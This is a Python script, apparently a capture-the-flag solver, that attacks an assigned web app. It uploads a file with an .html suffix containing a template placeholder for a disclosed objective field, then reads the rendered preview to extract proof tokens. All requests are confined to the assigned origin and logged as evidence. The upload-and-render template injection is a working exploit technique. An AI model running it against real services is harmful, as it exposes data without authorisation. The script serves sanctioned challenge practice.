#!/usr/bin/env python3
"""Use an assigned app's upload endpoint and preview route to recover its proof."""

from __future__ import annotations

import argparse
from datetime import datetime, timezone
from html.parser import HTMLParser
import hashlib
import json
from pathlib import Path
import re
import sys
import uuid
from urllib.error import HTTPError
from urllib.parse import urljoin, urlsplit
from urllib.request import Request, build_opener

from inspect_target import MAX_BODY_BYTES, normalize_url, origin, safe_filename


PROOF_RE = re.compile(rb"\bproof[_-][A-Za-z0-9_-]{12,}\b")
OBJECTIVE_RE = re.compile(
    r"field name for the attempt objective is\s*<code>([A-Za-z0-9_-]+)</code>",
    re.IGNORECASE,
)


class LinkParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.links: list[str] = []

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        href = dict(attrs).get("href")
        if tag == "a" and href:
            self.links.append(href)


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Upload a text template as an HTML-suffixed file and read its preview."
    )
    parser.add_argument("target", help="absolute target URL assigned by the Game Master")
    parser.add_argument("--output-dir", type=Path, help="directory for response evidence")
    parser.add_argument("--timeout", type=float, default=10.0)
    args = parser.parse_args()
    if args.timeout <= 0:
        parser.error("--timeout must be greater than zero")
    try:
        target = normalize_url(args.target)
        allowed_origin = origin(target)
    except ValueError as exc:
        parser.error(str(exc))

    host = urlsplit(target).hostname or "target"
    output_dir = args.output_dir or Path("web-tools/evidence") / f"{host}-upload"
    output_dir.mkdir(parents=True, exist_ok=True)
    opener = build_opener()
    records: list[dict[str, object]] = []

    def request(url: str, method: str = "GET", payload: bytes | None = None) -> bytes:
        normalized = normalize_url(url)
        if origin(normalized) != allowed_origin:
            raise ValueError(f"refusing off-origin request: {normalized}")
        headers = {"User-Agent": "HuntressCTF-Web-Solver/1.0", "Accept": "*/*"}
        if payload is not None:
            headers["Content-Type"] = "application/json"
        req = Request(normalized, data=payload, headers=headers, method=method)
        try:
            response = opener.open(req, timeout=args.timeout)
        except HTTPError as exc:
            response = exc
        body = response.read(MAX_BODY_BYTES + 1)
        truncated = len(body) > MAX_BODY_BYTES
        body = body[:MAX_BODY_BYTES]
        body_path = output_dir / safe_filename(len(records) + 1, normalized)
        body_path.write_bytes(body)
        records.append(
            {
                "url": normalized,
                "method": method,
                "status": getattr(response, "status", response.code),
                "content_type": response.headers.get("Content-Type", ""),
                "body_sha256": hashlib.sha256(body).hexdigest(),
                "body_bytes": len(body),
                "body_truncated": truncated,
                "body_file": body_path.name,
            }
        )
        if truncated:
            raise ValueError(f"response exceeded {MAX_BODY_BYTES} bytes")
        return body

    root_body = request(target)
    root = LinkParser()
    root.feed(root_body.decode("utf-8", errors="replace"))
    clues_path = next((href for href in root.links if "clues" in href), None)
    if not clues_path:
        raise ValueError("no challenge-provided clue link found")
    clues_url = normalize_url(urljoin(target, clues_path))
    if origin(clues_url) != allowed_origin:
        raise ValueError("clue route leaves assigned origin")
    clues = json.loads(request(clues_url).decode("utf-8"))
    feature_url = normalize_url(urljoin(target, str(clues["feature_route"])))
    render_url = normalize_url(urljoin(target, str(clues["render_route"])))

    guide_url = normalize_url(urljoin(target, str(clues["preview_guide"])))
    guide_body = request(guide_url).decode("utf-8", errors="replace")
    objective_match = OBJECTIVE_RE.search(guide_body)
    if not objective_match:
        raise ValueError("preview guide did not disclose the objective field name")
    objective_field = objective_match.group(1)
    filename = f"analyst-{uuid.uuid4().hex}.html"
    upload = {
        "filename": filename,
        "content": "{{" + objective_field + "}}",
        "content_type": "text/plain",
    }
    upload_body = request(
        feature_url, "POST", json.dumps(upload, separators=(",", ":")).encode("utf-8")
    )
    upload_result = json.loads(upload_body.decode("utf-8"))
    returned_path = upload_result.get("path")
    if not isinstance(returned_path, str) or not returned_path:
        raise ValueError(f"upload did not return a preview path: {upload_result}")
    preview_url = normalize_url(urljoin(render_url, returned_path))
    if origin(preview_url) != allowed_origin:
        raise ValueError("returned preview link leaves assigned origin")
    preview_body = request(preview_url)
    proofs = list(dict.fromkeys(PROOF_RE.findall(preview_body)))

    report = {
        "target": target,
        "created_at": datetime.now(timezone.utc).isoformat(),
        "clues": clues,
        "upload": upload,
        "upload_result": upload_result,
        "preview_url": preview_url,
        "proofs": [proof.decode("ascii") for proof in proofs],
        "responses": records,
    }
    report_path = output_dir / "report.json"
    report_path.write_text(
        json.dumps(report, indent=2, ensure_ascii=False) + "\n", encoding="utf-8"
    )
    print(
        json.dumps(
            {
                "report": str(report_path),
                "filename": filename,
                "preview_url": preview_url,
                "proofs": report["proofs"],
            },
            indent=2,
        )
    )
    return 0 if proofs else 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except (OSError, ValueError, KeyError, json.JSONDecodeError) as exc:
        print(json.dumps({"error": str(exc)}, indent=2), file=sys.stderr)
        sys.exit(1)
